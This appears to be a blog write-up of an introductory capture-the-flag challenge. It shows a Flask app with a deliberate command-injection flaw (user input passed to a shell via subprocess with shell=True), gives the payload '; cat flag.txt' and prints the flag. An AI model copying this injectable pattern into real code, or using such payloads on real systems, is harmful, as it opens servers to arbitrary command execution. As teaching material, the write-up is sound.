+++
date = "2025-03-05"
title = "Snyk Fetch The Flag - CTF 101"
author = "Javier Olmedo"
toc = false
+++

[![/images/snyk_fetch_the_flag_ctf_101/snyk_fetch_the_flag_ctf_101_banner.png](/images/snyk_fetch_the_flag_ctf_101/snyk_fetch_the_flag_ctf_101_banner.png)](/images/snyk_fetch_the_flag_ctf_101/snyk_fetch_the_flag_ctf_101_banner.png)

This challenge is designed as an **introduction to CTFs** (Capture The Flag). It is a simple challenge aimed at getting familiar with exploiting vulnerabilities in web applications.

By analyzing the provided source code, we can see that it is a web application developed with **Flask (Python)**. Here is the code:

```python
from flask import Flask, render_template, request, redirect, flash
import subprocess

app = Flask(__name__)
app.secret_key = "supersecretkey"

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        name = request.form.get("name", "").strip()

        if not name:
            flash("Error: Name cannot be empty.", "error")
            return redirect("/")

        try:
            # I sure hope no one tries to run any commands by injecting here...
            output = subprocess.check_output(f"echo {name}", shell=True, text=True, stderr=subprocess.STDOUT)
            flash(f"Hello, {output.strip()}! Good luck!", "success")
            # ...alright, the challenges won't be this obvious on game day, but I hope it gives you a good idea of how the game is played!
        except subprocess.CalledProcessError as e:
            flash(f"Error: {e.output.strip()}", "error")

        return redirect("/")

    return render_template("index.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

## 🔍 Where is the vulnerability?

The main issue lies in the following piece of code:

```python
output = subprocess.check_output(f"echo {name}", shell=True, text=True, stderr=subprocess.STDOUT)
```

Here, the `name` value (coming from unsanitized user input) is directly concatenated into a command executed via `subprocess.check_output()`, using `shell=True`. This allows us to concatenate a second command using the payload `; <command>`.

## 💣 Exploitation

To obtain the flag, we simply send the following payload as the value of `name`:

```bash
; cat flag.txt
```

[![/images/snyk_fetch_the_flag_ctf_101/snyk_fetch_the_flag_ctf_101_001.png](/images/snyk_fetch_the_flag_ctf_101/snyk_fetch_the_flag_ctf_101_001.png)](/images/snyk_fetch_the_flag_ctf_101/snyk_fetch_the_flag_ctf_101_001.png)

[![/images/snyk_fetch_the_flag_ctf_101/snyk_fetch_the_flag_ctf_101_002.png](/images/snyk_fetch_the_flag_ctf_101/snyk_fetch_the_flag_ctf_101_002.png)](/images/snyk_fetch_the_flag_ctf_101/snyk_fetch_the_flag_ctf_101_002.png)

## 🚩 Flag

```txt
flag{3b74fc0628299870edabc5072b25cf78}
```
